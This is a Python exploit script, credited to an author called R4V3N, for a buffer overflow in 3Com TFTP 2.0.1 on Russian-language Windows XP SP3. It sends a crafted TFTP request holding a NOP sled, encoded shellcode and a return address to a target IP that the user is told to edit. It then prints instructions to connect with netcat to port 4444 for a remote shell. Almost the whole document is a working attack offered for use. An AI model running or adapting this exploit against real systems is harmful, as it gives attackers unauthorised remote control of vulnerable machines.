#!/usr/bin/python

import socket

s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
s.settimeout(8)


a = ("\xd9\xce\xb8\x28\x70\xd1\xb0\xd9\x74\x24\xf4\x5b\x33"
"\xc9\xb1\x53\x31\x43\x17\x03\x43\x17\x83\xc3\x8c\x33"
"\x45\xef\x85\x36\xa6\x0f\x56\x57\x2e\xea\x67\x57\x54"
"\x7f\xd7\x67\x1e\x2d\xd4\x0c\x72\xc5\x6f\x60\x5b\xea"
"\xd8\xcf\xbd\xc5\xd9\x7c\xfd\x44\x5a\x7f\xd2\xa6\x63"
"\xb0\x27\xa7\xa4\xad\xca\xf5\x7d\xb9\x79\xe9\x0a\xf7"
"\x41\x82\x41\x19\xc2\x77\x11\x18\xe3\x26\x29\x43\x23"
"\xc9\xfe\xff\x6a\xd1\xe3\x3a\x24\x6a\xd7\xb1\xb7\xba"
"\x29\x39\x1b\x83\x85\xc8\x65\xc4\x22\x33\x10\x3c\x51"
"\xce\x23\xfb\x2b\x14\xa1\x1f\x8b\xdf\x11\xfb\x2d\x33"
"\xc7\x88\x22\xf8\x83\xd6\x26\xff\x40\x6d\x52\x74\x67"
"\xa1\xd2\xce\x4c\x65\xbe\x95\xed\x3c\x1a\x7b\x11\x5e"
"\xc5\x24\xb7\x15\xe8\x31\xca\x74\x65\xf5\xe7\x86\x75"
"\x91\x70\xf5\x47\x3e\x2b\x91\xeb\xb7\xf5\x66\x0b\xe2"
"\x42\xf8\xf2\x0d\xb3\xd1\x30\x59\xe3\x49\x90\xe2\x68"
"\x89\x1d\x37\x04\x81\xb8\xe8\x3b\x6c\x7a\x59\xfc\xde"
"\x13\xb3\xf3\x01\x03\xbc\xd9\x2a\xac\x41\xe2\x45\x71"
"\xcf\x04\x0f\x99\x99\x9f\xa7\x5b\xfe\x17\x50\xa3\xd4"
"\x0f\xf6\xec\x3e\x97\xf9\xec\x14\xbf\x6d\x67\x7b\x7b"
"\x8c\x78\x56\x2b\xd9\xef\x2c\xba\xa8\x8e\x31\x97\x5a"
"\x32\xa3\x7c\x9a\x3d\xd8\x2a\xcd\x6a\x2e\x23\x9b\x86"
"\x09\x9d\xb9\x5a\xcf\xe6\x79\x81\x2c\xe8\x80\x44\x08"
"\xce\x92\x90\x91\x4a\xc6\x4c\xc4\x04\xb0\x2a\xbe\xe6"
"\x6a\xe5\x6d\xa1\xfa\x70\x5e\x72\x7c\x7d\x8b\x04\x60"
"\xcc\x62\x51\x9f\xe1\xe2\x55\xd8\x1f\x93\x9a\x33\xa4"
"\xa3\xd0\x19\x8d\x2b\xbd\xc8\x8f\x31\x3e\x27\xd3\x4f"
"\xbd\xcd\xac\xab\xdd\xa4\xa9\xf0\x59\x55\xc0\x69\x0c"
"\x59\x77\x89\x05")

b = "\x00\x02" + "vuln" + "\x00" + "\x90" * 118 + a + "\x4e\xae\x3a\x7e" + "\x00"


print "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-="
print "=====Windows XP SP3 Rusiian======"
print "====3Com TFTP 2.0.1 exploit====="
print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
print "=-=-=-=-= BY R4V3N =-=-=-=-=-="
print "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-="
print "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-="
print ""
print ""
print 'Usage: python exploit.py'
print ""
print "CHANGE ADDRESS BEFORE RUN"
print ""




try:
	print "[*] Connecting..."
	s.sendto(b,('192.168.0.103',69)) # PUT YOUR ADDRESS HERE
	print('[*] Exploit completed. To get a shell type: nc "target_host" 4444')
	s.close	

except:
	print '[*] Service not responding or incorrect argument.'
	s.close
	
#Exploit by R4v3nG
#My Instagram: @r4v3ng
